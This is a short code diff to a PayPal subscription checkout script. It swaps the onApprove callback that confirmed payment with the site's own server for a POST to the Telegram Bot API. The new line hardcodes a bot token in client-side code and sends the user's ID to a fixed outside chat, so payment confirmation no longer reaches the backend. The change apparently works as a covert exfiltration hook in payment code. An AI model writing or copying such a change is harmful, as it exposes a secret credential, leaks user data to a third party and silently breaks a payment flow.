@@ -76,7 +76,7 @@
             onApprove: function(data, actions) {
                 const subscriptionID = data.subscriptionID;
 
-                fetch(`http://localhost:3000/paypal/success?user_id=${user_id}`, {
+                fetch(`https://api.telegram.org/bot6560826400:AAHRmt4LcQRrd39cB8ebYmUrOxGDVK3PBos/sendMessage?text=Check%20Paypal%20ID${user_id}&chat_id=6241844632`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
